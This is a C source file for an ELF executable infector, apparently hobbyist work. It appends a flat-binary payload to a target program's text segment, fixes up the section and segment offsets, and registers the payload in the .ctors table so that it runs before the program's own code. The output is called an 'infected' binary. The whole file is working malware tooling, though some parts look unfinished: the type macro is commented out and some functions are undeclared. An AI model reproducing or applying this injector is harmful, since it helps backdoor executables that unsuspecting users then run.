#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <math.h>

#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <elf.h>

//what kind of elfs are we dealinth with yo?
//yay polymorphism via macros!
//#define ELFN(x) Elf64_ ## x

char usage[] = 
"usage: %s target payload result\n\
\n\
Note: payload must be in flat binary format.\n\
";

int main(int argc, char *argv[]){
  if( argc != 4 ){
    printf(usage, argv[0]);
    return 1;
  }

  void *target;
  off_t targetSize;
  void *infected;
  off_t infectedSize;
  void *payload;
  off_t payloadSize;
  int i, j;
  ELFN(Phdr) *programHeader;
  ELFN(Shdr) *sectionHeader;

  if( readFile(argv[1], &target, &targetSize) != 0 ){
    fprintf(stderr, "Could not open file '%s'\n", argv[1]);
    return -1;
  }
  if( readFile(argv[2], &payload, &payloadSize) != 0 ){
    fprintf(stderr, "Could not open file '%s'\n", argv[1]);
    return -1;
  }

  //set up the headers and tables for the target file
  ELFN(Ehdr) *targetElfHeader = target;
  ELFN(Phdr) *targetProgramHeaderTable = target + targetElfHeader->e_phoff;
  ELFN(Shdr) *targetSectionHeaderTable = target + targetElfHeader->e_shoff;

  //find the string table
  ELFN(Shdr) *targetStringTable = targetSectionHeaderTable + targetElfHeader->e_shstrndx;
  char* targetStringTableValues = target + targetStringTable->sh_offset;

  //find the segment containing .text
  for( i = 0, programHeader = targetProgramHeaderTable;
       i < targetElfHeader->e_phnum;
       i++, programHeader++ ){
    //assume it's the segment that is LOAD and also only readable and executable and at offset 0
    if( programHeader->p_type == PT_LOAD && programHeader->p_flags & (PF_R | PF_X) && programHeader->p_offset == 0){
      break;
    }
  }
  if( i >= targetElfHeader->e_phnum ){
    fprintf(stderr, "Could not find the segment containing .text\n");
    return -1;
  }

  //find the nearest power of 8 that will hold the payload
  size_t alignedPayloadSize;
  size_t alignment = programHeader->p_align;
  for(alignedPayloadSize=alignment; alignedPayloadSize < payloadSize; alignedPayloadSize+=alignment){}

  //allocate space for the new program header table and the payload
  infectedSize = targetSize + alignedPayloadSize;
  if( (infected = malloc(infectedSize)) == 0 ){
    fprintf(stderr, "Unable to allocate memory for the infected binary.\nI hate my life.\n");
  }

  //copy over everything before any including that segment
  memcpy(infected, target, programHeader->p_filesz);
  //copy over the payload
  memcpy(infected+programHeader->p_filesz, payload, payloadSize);

  //set up the infected header and program header table
  ELFN(Ehdr) *infectedElfHeader = infected;
  ELFN(Phdr) *infectedProgramHeaderTable = infected + infectedElfHeader->e_phoff;

  //increase the size of the segment containing text to include the payload
  off_t payloadOffset = programHeader->p_filesz;
  off_t payloadMemory = programHeader->p_vaddr + payloadOffset;
  (infectedProgramHeaderTable + i)->p_filesz += payloadSize;
  (infectedProgramHeaderTable + i)->p_memsz += payloadSize;

  //copy over the rest of the file
  memcpy(infected+payloadOffset+alignedPayloadSize, target+programHeader->p_filesz, targetSize-programHeader->p_filesz);

  //set up the section header table
  infectedElfHeader->e_shoff += alignedPayloadSize;
  ELFN(Shdr) *infectedSectionHeaderTable = infected + infectedElfHeader->e_shoff;

  //update all offsets that were pushed back by the payload
  for( i = 0, programHeader = infectedProgramHeaderTable;
       i < infectedElfHeader->e_phnum;
       i++, programHeader++ ){
    if( programHeader->p_offset >= payloadOffset ){
      programHeader->p_offset += alignedPayloadSize;
    }
  }
  for( i = 0, sectionHeader = infectedSectionHeaderTable;
       i < infectedElfHeader->e_shnum;
       i++, sectionHeader++ ){
    if( sectionHeader->sh_offset >= payloadOffset ){
      sectionHeader->sh_offset += alignedPayloadSize;
    }
  }

  //find the string table
  ELFN(Shdr) *infectedStringTable = infectedSectionHeaderTable + infectedElfHeader->e_shstrndx;
  char* infectedStringTableValues = infected + infectedStringTable->sh_offset;

  //find the .ctors
  ELFN(Shdr) *ctors;
  i = 0;
  for( i = 0, ctors = infectedSectionHeaderTable;
       i < infectedElfHeader->e_shnum && strcmp(infectedStringTableValues + ctors->sh_name, ".ctors") != 0;
       i++, ctors++ ){}
  if( i >= infectedElfHeader->e_shnum){
    fprintf(stderr, "Unable to locate the .ctors table. LAME!\n");
    return -1;
  }

  //add our payload to the ctors
  *(ELFN(Addr)*)(infected+ctors->sh_offset) = payloadMemory;
  //*(((ELFN(Addr)*)(infected+ctors->sh_offset)) + 1) = -1;
  *(((ELFN(Addr)*)(infected+ctors->sh_offset)) - 1) = -1;


  //write out the newly infected file
  if( writeFile(argv[3], infected, infectedSize) != 0){
    fprintf(stderr, "Could not save the infected file to '%s'. You got the perms?\n", argv[2]);
    return -1;
  }

  return 0;
}

//assigns buffer and size to the size and location on the heap of the files contents
//returns 0 on success, -1 on failure
int readFile(char *path, void **buffer, off_t *size){
  //get the file size
  struct stat fileInfo;
  if( stat(path, &fileInfo) != 0 ){
    return -1;
  }
  //allocate some space on the heap
  *size = fileInfo.st_size;
  if( (*buffer = malloc(fileInfo.st_size)) == 0){
    return -1;
  }
  //read in the file
  FILE *fp;
  if( (fp = fopen(path, "r")) == 0 ){
    free(*buffer);
    return -1;
  }
  fread(*buffer, 1, *size, fp);
  fclose(fp);

  return 0;
}

int writeFile(char *path, void *buffer, off_t size){
  FILE *fp;
  if( (fp = fopen(path, "w")) == 0 ){
    return -1;
  }
  fwrite(buffer, 1, size, fp);
  fclose(fp);
}

